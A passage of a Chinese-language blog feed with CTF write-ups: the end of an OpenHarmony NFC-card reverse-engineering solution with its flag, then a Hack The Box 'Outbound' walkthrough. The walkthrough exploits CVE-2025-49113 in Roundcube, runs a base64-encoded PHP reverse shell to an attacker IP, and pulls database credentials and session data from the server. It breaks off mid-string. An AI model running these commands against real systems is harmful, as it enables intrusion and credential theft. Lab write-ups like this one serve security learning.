class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><br></code></pre></td></tr></table></figure><p>脚本转化为 ASCII 字符</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hex_to_ascii</span>(<span class="hljs-params">hex_line</span>):<br>    <span class="hljs-keyword">try</span>:<br>        bytes_data = <span class="hljs-built_in">bytes</span>.fromhex(hex_line)<br>        ascii_str = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(b) <span class="hljs-keyword">if</span> <span class="hljs-number">32</span> &lt;= b &lt;= <span class="hljs-number">126</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> bytes_data)<br>        <span class="hljs-keyword">return</span> ascii_str<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_nfc_blocks</span>(<span class="hljs-params">file_path</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        lines = f.readlines()<br><br>    ascii_blocks = &#123;&#125;<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>        <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;Block (\d+): ([0-9A-Fa-f ]+)&#x27;</span>, line)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>            block_num = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>))<br>            hex_data = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>).strip()<br>            ascii_str = hex_to_ascii(hex_data)<br>            ascii_blocks[block_num] = ascii_str<br><br>    <span class="hljs-keyword">return</span> ascii_blocks<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    input_file = <span class="hljs-string">&#x27;Card.nfc&#x27;</span><br>    blocks = parse_nfc_blocks(input_file)<br><br>    <span class="hljs-keyword">for</span> block_num <span class="hljs-keyword">in</span> <span class="hljs-built_in">sorted</span>(blocks):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Block <span class="hljs-subst">&#123;block_num:02d&#125;</span>: <span class="hljs-subst">&#123;blocks[block_num]&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>每 4 个 block 一组，第 4-8 个 block中的明文就是 flag，第 7 个 block 没用</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs lasso">Block <span class="hljs-number">00</span>: my_card.D<span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">01</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">02</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">03</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span>xw..sdIeAQ<br>Block <span class="hljs-number">04</span>: <span class="hljs-number">.0</span>..,T.enma5t3r1<br>Block <span class="hljs-number">05</span>: ng_s7ruc7ur3_0f_<br>Block <span class="hljs-number">06</span>: m1far3_card_pXLF<br>Block <span class="hljs-number">07</span>: rviLgEpjiNsdIeAQ<br>Block <span class="hljs-number">08</span>: OtFJuiKCkbPhNPzV<br>Block <span class="hljs-number">09</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">10</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">11</span>: rviLgEpjiNsdIeAQ<br>Block <span class="hljs-number">12</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">13</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">14</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">15</span>: rviLgEpjiNsdIeAQ<br>Block <span class="hljs-number">16</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">17</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">18</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">19</span>: rviLgEpjiNsdIeAQ<br>Block <span class="hljs-number">20</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">21</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">22</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">23</span>: rviLgEpjiNsdIeAQ<br>Block <span class="hljs-number">24</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">25</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">26</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">27</span>: rviLgEpjiNsdIeAQ<br>Block <span class="hljs-number">28</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">29</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">30</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">31</span>: rviLgEpjiNsdIeAQ<br>Block <span class="hljs-number">32</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">33</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">34</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">35</span>: rviLgEpjiNsdIeAQ<br>Block <span class="hljs-number">36</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">37</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">38</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">39</span>: rviLgEpjiNsdIeAQ<br>Block <span class="hljs-number">40</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">41</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">42</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">43</span>: rviLgEpjiNsdIeAQ<br>Block <span class="hljs-number">44</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">45</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">46</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">47</span>: rviLgEpjiNsdIeAQ<br>Block <span class="hljs-number">48</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">49</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">50</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">51</span>: rviLgEpjiNsdIeAQ<br>Block <span class="hljs-number">52</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">53</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">54</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">55</span>: rviLgEpjiNsdIeAQ<br>Block <span class="hljs-number">56</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">57</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">58</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">59</span>: rviLgEpjiNsdIeAQ<br>Block <span class="hljs-number">60</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">61</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">62</span>: <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br>Block <span class="hljs-number">63</span>: rviLgEpjiNsdIeAQ<br></code></pre></td></tr></table></figure><p>因此拼接后flag是</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;enma5t3r1ng_s7ruc7ur3_0f_m1far3_card_pXLFOtFJuiKCkbPhNPzV&#125;</span><br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>第一次接触关于鸿蒙的，复现也还是学到了挺多东西</p><p>鸿蒙反编译工具： <a href="https://github.com/ohos-decompiler/abc-decompiler">https://github.com/ohos-decompiler/abc-decompiler</a></p>]]></content>
    
    
    <categories>
      
      <category>只关于 Reverse</category>
      
      <category>赛题复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse OpenHarmony</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-OutBound</title>
    <link href="/2025/07/17/HTB-OutBound/"/>
    <url>/2025/07/17/HTB-OutBound/</url>
    
    <content type="html"><![CDATA[<h1 id="Outbound"><a href="#Outbound" class="headerlink" title="Outbound"></a>Outbound</h1><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">As</span> <span class="hljs-keyword">is</span> common <span class="hljs-keyword">in</span> <span class="hljs-type">real</span> life pentests, you will <span class="hljs-keyword">start</span> the Outbound <span class="hljs-type">box</span> <span class="hljs-keyword">with</span> credentials <span class="hljs-keyword">for</span> the <span class="hljs-keyword">following</span> account tyler / LhKL1o9Nm3X2<br></code></pre></td></tr></table></figure><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:<span class="hljs-built_in">df</span> (ECDSA)<br>|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:<span class="hljs-built_in">df</span>:38:b0 (ED25519)<br>80/tcp open  http    nginx 1.24.0 (Ubuntu)<br>|_http-title: Did not follow redirect to http://mail.outbound.htb/<br>|_http-server-header: nginx/1.24.0 (Ubuntu)<br>No exact OS matches <span class="hljs-keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).<br></code></pre></td></tr></table></figure><p>俩端口，有个子域名 <code>mail.outbound.htb</code></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>一个网页邮箱，RoundCube</p><img src="https://img.dkdun.cn/v1/2025/12/b00e2c9f9e3c0b8a.png" alt="image-20250715233225435" style="zoom:67%;" /><p>用给的账号密码登录查看版本信息，发现是 1.6.10 ，查到有一个 RCE 漏洞，找到对应 CVE，CVE-2025-49113 - Roundcube Remote Code Execution</p><h1 id="CVE-2025-49113"><a href="#CVE-2025-49113" class="headerlink" title="CVE-2025-49113"></a>CVE-2025-49113</h1><p>这个漏洞需要先登录，然后发送包含恶意 <code>_from</code> 参数的 HTTP 请求来触发漏洞</p><p>POC：<a href="https://github.com/hakaioffsec/CVE-2025-49113-exploit">https://github.com/hakaioffsec/CVE-2025-49113-exploit</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php CVE-2025-49113.php &lt;url&gt; &lt;username&gt; &lt;password&gt; &lt;<span class="hljs-built_in">command</span>&gt;<br></code></pre></td></tr></table></figure><p>按照格式打，反弹 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php CVE-2025-49113.php http://mail.outbound.htb/ tyler <span class="hljs-string">&quot;LhKL1o9Nm3X2&quot;</span> <span class="hljs-string">&#x27;echo L3Vzci9iaW4vcGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjEwLjE2LjQ1IiwxMjM0KTtleGVjKCIvYmluL2Jhc2ggPCYzID4mMyAyPiYzIik7Jw== | base64 -d | bash&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/a5ef8ad3058315c8.png" alt="image-20250716000131046"></p><p>首先试了 sudo -l，但没用，在 tyler 用户下找到了关于数据库的东西</p><h1 id="利用数据库查找-session-中的-password"><a href="#利用数据库查找-session-中的-password" class="headerlink" title="利用数据库查找 session 中的 password"></a>利用数据库查找 session 中的 password</h1><p>在 <code>/var/www/html/roundcube/config</code> 目录下的 config.inc.php 文件发现了数据库相关配置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> +-----------------------------------------------------------------------+</span><br><span class="hljs-comment"> | Local configuration for the Roundcube Webmail installation.           |</span><br><span class="hljs-comment"> |                                                                       |</span><br><span class="hljs-comment"> | This is a sample configuration file only containing the minimum       |</span><br><span class="hljs-comment"> | setup required for a functional installation. Copy more options       |</span><br><span class="hljs-comment"> | from defaults.inc.php to this file to override the defaults.          |</span><br><span class="hljs-comment"> |                                                                       |</span><br><span class="hljs-comment"> | This file is part of the Roundcube Webmail client                     |</span><br><span class="hljs-comment"> | Copyright (C) The Roundcube Dev Team                                  |</span><br><span class="hljs-comment"> |                                                                       |</span><br><span class="hljs-comment"> | Licensed under the GNU General Public License version 3 or            |</span><br><span class="hljs-comment"> | any later version with exceptions for skins &amp; plugins.                |</span><br><span class="hljs-comment"> | See the README file for a full license statement.                     |</span><br><span class="hljs-comment"> +-----------------------------------------------------------------------+</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-variable">$config</span> = [];<br><br><span class="hljs-comment">// Database connection string (DSN) for read+write operations</span><br><span class="hljs-comment">// Format (compatible with PEAR MDB2): db_provider://user:password@host/database</span><br><span class="hljs-comment">// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle</span><br><span class="hljs-comment">// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php</span><br><span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> for SQLite use absolute path (Linux): &#x27;sqlite:////full/path/to/sqlite.db?mode=0646&#x27;</span><br><span class="hljs-comment">//       or (Windows): &#x27;sqlite:///C:/full/path/to/sqlite.db&#x27;</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;db_dsnw&#x27;</span>] = <span class="hljs-string">&#x27;mysql://roundcube:RCDBPass2025@localhost/roundcube&#x27;</span>;<br><br><span class="hljs-comment">// IMAP host chosen to perform the log-in.</span><br><span class="hljs-comment">// See defaults.inc.php for the option description.</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;imap_host&#x27;</span>] = <span class="hljs-string">&#x27;localhost:143&#x27;</span>;<br><br><span class="hljs-comment">// SMTP server host (for sending mails).</span><br><span class="hljs-comment">// See defaults.inc.php for the option description.</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;smtp_host&#x27;</span>] = <span class="hljs-string">&#x27;localhost:587&#x27;</span>;<br><br><span class="hljs-comment">// SMTP username (if required) if you use %u as the username Roundcube</span><br><span class="hljs-comment">// will use the current username for login</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;smtp_user&#x27;</span>] = <span class="hljs-string">&#x27;%u&#x27;</span>;<br><br><span class="hljs-comment">// SMTP password (if required) if you use %p as the password Roundcube</span><br><span class="hljs-comment">// will use the current user&#x27;s password for login</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;smtp_pass&#x27;</span>] = <span class="hljs-string">&#x27;%p&#x27;</span>;<br><br><span class="hljs-comment">// provide an URL where a user can get support for this Roundcube installation</span><br><span class="hljs-comment">// PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE!</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;support_url&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-comment">// Name your service. This is displayed on the login screen and in the window title</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;product_name&#x27;</span>] = <span class="hljs-string">&#x27;Roundcube Webmail&#x27;</span>;<br><br><span class="hljs-comment">// This key is used to encrypt the users imap password which is stored</span><br><span class="hljs-comment">// in the session record. For the default cipher method it must be</span><br><span class="hljs-comment">// exactly 24 characters long.</span><br><span class="hljs-comment">// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;des_key&#x27;</span>] = <span class="hljs-string">&#x27;rcmail-!24ByteDESkey*Str&#x27;</span>;<br><br><span class="hljs-comment">// List of active plugins (in plugins/ directory)</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;plugins&#x27;</span>] = [<br>    <span class="hljs-string">&#x27;archive&#x27;</span>,<br>    <span class="hljs-string">&#x27;zipdownload&#x27;</span>,<br>];<br><br><span class="hljs-comment">// skin name: folder from skins/</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;skin&#x27;</span>] = <span class="hljs-string">&#x27;elastic&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;default_host&#x27;</span>] = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;smtp_server&#x27;</span>] = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br></code></pre></td></tr></table></figure><p>根据信息登录数据库</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;db_dsnw&#x27;</span>] = <span class="hljs-string">&#x27;mysql://roundcube:RCDBPass2025@localhost/roundcube&#x27;</span>;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e &#x27;show databases;&#x27; -E<br></code></pre></td></tr></table></figure><p>使用 roundcube 数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs mysql">Database<br>information_schema<br>roundcube<br>Tables_in_roundcube<br>cache<br>cache_index<br>cache_messages<br>cache_shared<br>cache_thread<br>collected_addresses<br>contactgroupmembers<br>contactgroups<br>contacts<br>dictionary<br>filestore<br>identities<br>responses<br>searches<br>session<br>system<br>users<br></code></pre></td></tr></table></figure><p>查询后发现有这些表，先看的 users 表，但是没有密码，查看 session 表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e &#x27;use roundcube;select * from session;&#x27; -E<br></code></pre></td></tr></table></figure><p>解密 session 的 var 字段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">language|s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;en_US&quot;</span>;imap_namespace|a:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;personal&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;a:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">0</span>:<span class="hljs-string">&quot;&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;/&quot;</span>;&#125;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;other&quot;</span>;N;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;shared&quot;</span>;N;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;prefix_out&quot;</span>;s:<span class="hljs-number">0</span>:<span class="hljs-string">&quot;&quot;</span>;&#125;imap_delimiter|s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;/&quot;</span>;imap_list_conf|a:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;N;i:<span class="hljs-number">1</span>;a:<span class="hljs-number">0</span>:&#123;&#125;&#125;user_id|i:<span class="hljs-number">1</span>;username|s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;jacob&quot;</span>;storage_host|s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;localhost&quot;</span>;storage_port|i:<span class="hljs-number">143</span>;storage_ssl|b:<span class="hljs-number">0</span>;password|s:<span class="hljs-number">32</span>:<span 